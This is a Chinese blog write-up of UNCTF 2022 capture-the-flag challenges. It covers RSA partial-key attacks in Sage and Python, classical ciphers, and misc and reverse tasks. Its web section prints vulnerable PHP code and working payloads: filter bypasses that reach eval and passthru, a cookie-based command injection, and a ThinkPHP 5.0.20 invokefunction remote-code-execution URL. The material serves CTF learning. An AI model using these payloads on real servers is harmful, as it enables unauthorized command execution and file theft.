<h2 id="ddddd"><a href="#ddddd" class="headerlink" title="ddddd"></a>ddddd</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">根据题目可得这应该是摩丝密码  替换得</span><br><span class="line"></span><br><span class="line">..- -. -.-. - ..-. ----.-- -.-- ....- ... ..--.- - .... .---- ... ..--.- .--- ..- ... - ..--.- -- ----- .-. ... . -----.-</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;</span><br></pre></td></tr></table></figure>



<h2 id="ez-RSA"><a href="#ez-RSA" class="headerlink" title="ez-RSA"></a>ez-RSA</h2><p>该题位p的高位攻击  先还原出原来的p</p>
<p>先用sage求出p</p>
<p>然后利用脚本求出flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#sage</span></span><br><span class="line"><span class="comment"># n = 102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line"><span class="comment"># p= (8183408885924573625481737168030555426876736448015512229437332241283388177166503450163622041857) &lt;&lt; 200</span></span><br><span class="line"><span class="comment"># e = 0x10001</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># pbits = p.nbits()</span></span><br><span class="line"><span class="comment"># kbits = 200</span></span><br><span class="line"><span class="comment"># ph = p &amp; (2 ^ pbits - 2 ^ kbits)</span></span><br><span class="line"><span class="comment"># PR.&lt; x &gt; = PolynomialRing(Zmod(n))</span></span><br><span class="line"><span class="comment"># f = x + ph</span></span><br><span class="line"><span class="comment"># xx = f.small_roots(X=2 ^ kbits, beta=0.4)[0]</span></span><br><span class="line"><span class="comment"># print(xx + ph)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e=<span class="number">0x10001</span></span><br><span class="line">c=<span class="number">6423951485971717307108570552094997465421668596714747882611104648100280293836248438862138501051894952826415798421772671979484920170142688929362334687355938148152419374972520025565722001651499172379146648678015238649772132040797315727334900549828142714418998609658177831830859143752082569051539601438562078140</span></span><br><span class="line">n=<span class="number">102089505560145732952560057865678579074090718982870849595040014068558983876754569662426938164259194050988665149701199828937293560615459891835879217321525050181965009152805251750575379985145711513607266950522285677715896102978770698240713690402491267904700928211276700602995935839857781256403655222855599880553</span></span><br><span class="line"></span><br><span class="line">p= <span class="number">13150231070519276795503757637337326535824298772055543325920447062237907554543786311611680606624189166397403108357856813812282725390555389844248256805325917</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>



<p>UNCTF{It is a very_intersting_test!!!}</p>
<h2 id="BABYRSA"><a href="#BABYRSA" class="headerlink" title="BABYRSA"></a>BABYRSA</h2><p>该题是m高位攻击</p>
<p>先用sage脚本求出m然后直接转为flag</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">phase2</span>(<span class="params">high_m, n, c</span>):</span><br><span class="line">    R.&lt;x&gt; = PolynomialRing(Zmod(n), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    m = high_m + x</span><br><span class="line">    M = m((m^<span class="number">6</span> - c).small_roots()[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(M)))</span><br><span class="line">n = <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">c = <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">high_m = <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line">phase2(high_m, n, c)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370002429378909002883709</span>)))</span><br><span class="line"><span class="comment">#UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="超级加倍"><a href="#超级加倍" class="headerlink" title="超级加倍"></a>超级加倍</h2><p>拿到一段数字刚开始没什么思路 然后就试了一下扔进分解网站上分解  得到一个数得四次方</p>
<p><img src="/2023/02/01/UNCTF/MyBlog\source_posts\UNCTF.assets\1668735177334.png" alt="1668735177334"></p>
<p>然后尝试了直接利用在线网站转为文本但是出不来   就试着转为字节流试了一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(<span class="number">777244835068351678348953354168377613564714552731792102125659619461244461053654492541</span>)))</span><br></pre></td></tr></table></figure>

<p>UNCTF{it_is_much_bigger_than_before}</p>
<h2 id="今晚吃什么"><a href="#今晚吃什么" class="headerlink" title="今晚吃什么"></a>今晚吃什么</h2><p>刚开始以为是摩丝  但是每个之间都有空格  然后又试了一下  二进制都不对</p>
<p>然后又看了下题目  今晚吃什么  可以想到培根密码</p>
<p>然后把1000换成A 00000换成B然后在在线网站解密</p>
<p><img src="/2023/02/01/UNCTF/MyBlog\source_posts\UNCTF.assets\1668740686177.png" alt="1668740686177"></p>
<p>得到UNCTF{CRYPROISFUN}</p>
<h2 id="Fermat"><a href="#Fermat" class="headerlink" title="Fermat"></a>Fermat</h2><p>费马小定理</p>
<p>如果a,p两个数互为质数则    a**(p-1)  &#x3D;  1  mod p</p>
<p>g &#x3D; x(p-1)</p>
<p>这里令a&#x3D;2**x   p&#x3D;p</p>
<p>根据费马小定理得</p>
<p>2**x(p-1)   mod  p  &#x3D;  1</p>
<p>即为2**g  mod  p &#x3D; 1</p>
<p>(2**g  mod  n)  mod p &#x3D; 1</p>
<p>所以 pow(2,g,n) - 1 &#x3D;k*p</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">19793392713544070457027688479915778034777978273001720422783377164900114996244094242708846944654400975309197274029725271852278868848866055341793968628630614866044892220651519906766987523723167772766264471738575578352385622923984300236873960423976260016266837752686791744352546924090533029391012155478169775768669029210298020072732213084681874537570149819864200486326715202569620771301183541168920293383480995205295027880564610382830236168192045808503329671954996275913950214212865497595508488636836591923116671959919150665452149128370999053882832187730559499602328396445739728918488554797208524455601679374538090229259</span></span><br><span class="line">c = <span class="number">388040015421654529602726530745444492795380886347450760542380535829893454552342509717706633524047462519852647123869277281803838546899812555054346458364202308821287717358321436303133564356740604738982100359999571338136343563820284214462840345638397346674622692956703291932399421179143390021606803873010804742453728454041597734468711112843307879361621434484986414368504648335684946420377995426633388307499467425060702337163601268480035415645840678848175121483351171989659915143104037610965403453400778398233728478485618134227607237718738847749796204570919757202087150892548180370435537346442018275672130416574430694059</span></span><br><span class="line">g = <span class="number">28493930909416220193248976348190268445371212704486248387964331415565449421099615661533797087163499951763570988748101165456730856835623237735728305577465527656655424601018192421625513978923509191087994899267887557104946667250073139087563975700714392158474439232535598303396614625803120915200062198119177012906806978497977522010955029535460948754300579519507100555238234886672451138350711195210839503633694262246536916073018376588368865238702811391960064511721322374269804663854748971378143510485102611920761475212154163275729116496865922237474172415758170527875090555223562882324599031402831107977696519982548567367160</span></span><br><span class="line">p = gmpy2.gcd(<span class="built_in">pow</span>(<span class="number">2</span>,g,n)-<span class="number">1</span>,n)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure>

<p>UNCTF{DO_y0u_Fermat_1ittle_theOrem}</p>
<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="magic-word"><a href="#magic-word" class="headerlink" title="magic_word"></a>magic_word</h2><p>直接在网站上解码</p>
<p><img src="/2023/02/01/UNCTF/1668692896809.png" alt="1668692896809"></p>
<p>unctf{We1come_new_ctfer}</p>
<h2 id="找得到我吗"><a href="#找得到我吗" class="headerlink" title="找得到我吗"></a>找得到我吗</h2><p>把docx文件改为zip文件  然后解压得</p>
<p>然后以记事本打开</p>
<p><img src="/2023/02/01/UNCTF/1668693152120.png" alt="1668693152120">  </p>
<p>直接搜索flag得</p>
<p><img src="/2023/02/01/UNCTF/1668693203672.png" alt="1668693203672">UNCTF{You_find_me!}</p>
<h2 id="syslog"><a href="#syslog" class="headerlink" title="syslog"></a>syslog</h2><p>在syslog里面找到password    cGFzc3dvcmQgaXMgVTZudTJfaTNfYjNTdA&#x3D;&#x3D;  解码得   U6nu2_i3_b3St</p>
<p>然后输入压缩包密码  在flag.txt里面  找到flag</p>
<p><img src="/2023/02/01/UNCTF/1668693426170.png" alt="1668693426170"></p>
<p>unctf{N1_sH3_D0n9_L0g_dE!}</p>
<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="welcomeUNCTF2022"><a href="#welcomeUNCTF2022" class="headerlink" title="welcomeUNCTF2022"></a>welcomeUNCTF2022</h2><p>经过分析得输入  UNCTF&amp;2022</p>
<p><img src="/2023/02/01/UNCTF/1668698214475.png" alt="1668698214475"></p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="whereisyourkey"><a href="#whereisyourkey" class="headerlink" title="whereisyourkey"></a>whereisyourkey</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;vgpkcmhnci&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="comment">#print(a[i])</span></span><br><span class="line">    <span class="keyword">if</span> a[i] &lt;= <span class="string">&#x27;o&#x27;</span> <span class="keyword">and</span> a[i]&lt;=<span class="string">&#x27;n&#x27;</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag+=<span class="built_in">chr</span>(<span class="built_in">ord</span>(a[i])+<span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UNCTF&#123;yesiamflag&#125;</span><br></pre></td></tr></table></figure>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="easy-upload"><a href="#easy-upload" class="headerlink" title="easy_upload"></a>easy_upload</h2><p>通过上传文件可以得出只有png文件可以上传成功</p>
<p>然后通过扫描网站目录得到一个<a target="_blank" rel="noopener" href="http://www.rar压缩包下载得到index.php/">www.rar压缩包下载得到index.php</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\.\.|\/\//i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;no hack&quot;</span>;</span><br><span class="line"> <span class="keyword">exit</span>();</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;upload.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>发现如果通过GET方式传入一个文件 如果不出现被过滤得词就会include包含</p>
<p>然后就上传一个png文件 发现POST好像被过滤  那我们就用GET构造shell</p>
<p><img src="/2023/02/01/UNCTF/1668607591804.png" alt="1668607591804"></p>
<p><img src="/2023/02/01/UNCTF/1668607675461.png" alt="1668607675461"></p>
<p>然后在tmp下找到了flag.sh</p>
<p>然后cat查看内容</p>
<p><img src="/2023/02/01/UNCTF/1668607760805.png" alt="1668607760805"></p>
<p>flag目录应该在&#x2F;home&#x2F;ctf&#x2F;flag目录下</p>
<p>然后cat得到   UNCTF{165e39e0-cae3-4935-80cd-e7ef9242edee}</p>
<h2 id="我太喜欢bilibili大学啦修复版"><a href="#我太喜欢bilibili大学啦修复版" class="headerlink" title="我太喜欢bilibili大学啦修复版"></a>我太喜欢bilibili大学啦修复版</h2><p>先是找到了hint_1    YWRtaW5fdW5jdGYucGhw</p>
<p>base64解码得          admin_unctf.php</p>
<p>然后得到一个登录页面查看源代码提醒我们抓包   在响应头里找到</p>
<p>dW5jdGYyMDIyL3VuY3RmMjAyMg&#x3D;&#x3D;</p>
<p>解码得unctf2022&#x2F;unctf2022</p>
<p>登陆得</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;FLAG=nonono&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;username or password is empty&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&quot;unctf2022&quot;</span> &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>] === <span class="string">&quot;unctf2022&quot;</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        @<span class="title function_ invoke__">system</span>(<span class="string">&quot;ping &quot;</span>.<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;username or password error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>



<p>在cookie里加入cmd命令</p>
<p><img src="/2023/02/01/UNCTF/1668609960920.png" alt="1668609960920"></p>
<p>base64解密到</p>
<p><a target="_blank" rel="noopener" href="https://space.bilibili.com/673907356">https://space.bilibili.com/673907356</a></p>
<p>访问得到flag</p>
<p>UNCTF{this_is_so_easy}</p>
<h1 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h1><p><img src="/2023/02/01/UNCTF/1668610926120.png" alt="1668610926120"></p>
<p>在源码里找到  20200101  20200101</p>
<p>然后后面是   20200102   20200102</p>
<p>一直到          20200131  20200131  </p>
<p>得到flag    flag{bfff6d206cbcd6ac0870a4f48</p>
<p>但是再往下flag就断了</p>
<p>最后发现2020132  一直到2020140</p>
<p>得到flag</p>
<p>UNCTF{bfff6d206cbcd6ac0870a4f48c7c313b}</p>
<h1 id="babyphp"><a href="#babyphp" class="headerlink" title="babyphp"></a>babyphp</h1><p>先扫描根目录发现了index.php文件  然后访问得到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]==<span class="number">0</span>&amp;&amp;<span class="variable">$_POST</span>[<span class="string">&quot;a&quot;</span>]!==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key1&quot;</span>])&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;key2&quot;</span>]))&#123;</span><br><span class="line">            <span class="variable">$key1</span>=<span class="variable">$_POST</span>[<span class="string">&quot;key1&quot;</span>];</span><br><span class="line">            <span class="variable">$key2</span>=<span class="variable">$_POST</span>[<span class="string">&quot;key2&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="variable">$key1</span>!==<span class="variable">$key2</span>&amp;&amp;<span class="title function_ invoke__">sha1</span>(<span class="variable">$key1</span>)==<span class="title function_ invoke__">sha1</span>(<span class="variable">$key2</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span><span class="title function_ invoke__"> </span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>]))&#123;</span><br><span class="line">                    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&quot;code&quot;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|system|txt|cat|tac|sort|shell|\.| |\&#x27;/i&quot;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">                        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">                    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;有手就行&lt;/br&gt;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;老套路了&lt;/br&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;很简单的，很快就拿flag了~_~&lt;/br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;百度就能搜到的东西&lt;/br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;easy 不 easy ,baby 真 baby,都是玩烂的东西，快拿flag！！！&lt;/br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>然后通过POST传入参数a利用科学计数法绕过第一层</p>
<p>然后是绕过sha1  利用数组绕过</p>
<p>POST绕过payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=s878926199a&amp;key1[]=1&amp;key2[]=2</span><br></pre></td></tr></table></figure>

<p>然后是GE传参</p>
<p>过滤了  flag|system|txt|cat|tac|sort|shell|.| |&#39;   还过滤了空格  %20  %27</p>
<p>可以利用passthru绕过system  利用双引号绕过单引号   利用  %09绕过空格</p>
<p>利用  ?code&#x3D;passthru(“ls%09&#x2F;“);得到</p>
<p><img src="/2023/02/01/UNCTF/1668656852081.png" alt="1668656852081"></p>
<p>可以发现有flag.txt  但是   cat   flag  txt   .  都被过滤</p>
<p>利用more 绕过  cat  利用  * 绕过   flag  txt .</p>
<p>payload</p>
<p>?code&#x3D;passthru(“more%09&#x2F;fl*”);</p>
<p><img src="/2023/02/01/UNCTF/1668657007376.png" alt="1668657007376"></p>
<p>UNCTF{99hanDis_pHP_Ba_True_flag}</p>
<h1 id="ezgame"><a href="#ezgame" class="headerlink" title="ezgame"></a>ezgame</h1><p>通过查找页面源代码  发现main.js 然后打开js代码   搜索unctf得到</p>
<p><img src="/2023/02/01/UNCTF/1668659315693.png" alt="1668659315693"></p>
<p>把它们连接经过尝试得到flag</p>
<p>UNCTF{c5f9a27d-6f88-49fb-a510-fe7b163f8dd3}</p>
<h1 id="给你一刀"><a href="#给你一刀" class="headerlink" title="给你一刀"></a>给你一刀</h1><p><img src="/2023/02/01/UNCTF/1668660124391.png" alt="1668660124391"></p>
<p>打开题目是这样一个页面 应该是thinphp漏洞  然后随便通过一个GET传参发现是thinkphp5.0.20漏洞</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://d1021445-6982-4789-b0d2-b6ba3ffe304e.node.yuzhian.com.cn/index.php?s=/Index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=-1`%20and%20it%27ll%20execute%20the%20phpinfo%EF%BC%9A</span><br></pre></td></tr></table></figure>

<p>得到phpinfo页面  然后直接搜索  unctf</p>
<p><img src="/2023/02/01/UNCTF/1668660310042.png" alt="1668660310042"></p>
<p>UNCTF{Y0u_A3r_so_G9eaD_hacker} </p>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/UNCTF/" rel="tag">UNCTF</a></li></ul>

    </footer>
  </div>

   
   
  
</article>

    
  </article>
  

  
  <nav class="page-nav">
    
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/2/">下一页</a>
  </nav>
  
</section>
</div>

      <footer class="footer">
  <div class="outer">
    <ul>
      <li>
        Copyrights &copy;
        2023
        <i class="ri-heart-fill heart_icon"></i> f14g
      </li>
    </ul>
    <ul>
      <li>
        
      </li>
    </ul>
    <ul>
      <li>
        
        
        <span>
  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></span>
  <span class="division">|</span>
  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
</span>
        
      </li>
    </ul>
    <ul>
      
    </ul>
    <ul>
      
    </ul>
    <ul>
      <li>
        <!-- cnzz统计 -->
        
        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
        
      </li>
    </ul>
  </div>
</footer>    
    </main>
    <div class="float_btns">
      <div class="totop" id="totop">
  <i class="ri-arrow-up-line"></i>
</div>

<div class="todark" id="todark">
  <i class="ri-moon-line"></i>
</div>

    </div>
    <aside class="sidebar on">
      <button class="navbar-toggle"></button>
<nav class="navbar">
  
  <div class="logo">
    <a href="/"><img src="/favicon.ico" alt="CTF"></a>
  </div>
  
  <ul class="nav nav-main">
    
    <li class="nav-item">
      <a class="nav-item-link" href="/">主页</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/archives">归档</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/categories">分类</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/tags">标签</a>
    </li>
    
    <li class="nav-item">
      <a class="nav-item-link" href="/me">关于我</a>
    </li>
    
  </ul>
</nav>
<nav class="navbar navbar-bottom">
  <ul class="nav">
    <li class="nav-item">
      
      <a class="nav-item-link nav-item-search"  title="搜索">
        <i class="ri-search-line"></i>
      </a>
      
      
      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
        <i class="ri-rss-line"></i>
      </a>
      
    </li>
  </ul>
</nav>
<div class="search-form-wrap">
  <div class="local-search local-search-plugin">
  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
  <div id="local-search-result" class="local-search-result"></div>
</div>
</div>
    </aside>
    <div id="mask"></div>

<!-- #reward -->
<div id="reward">
  <span class="close"><i class="ri-close-line"></i></span>
  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
  <div class="reward-box">
    
    
    <div class="reward-item">
      <img class="reward-img" src="/images/wechat.jpg">
      <span class="reward-type">微信</span>
    </div>
    
  </div>
</div>
    
<script src="/js/jquery-3.6.0.min.js"></script>
 
<script src="/js/lazyload.min.js"></script>

<!-- Tocbot -->

<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
<link
  rel="stylesheet"
  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
/>
<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>

<script src="/dist/main.js"></script>

<!-- ImageViewer -->
 <!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>

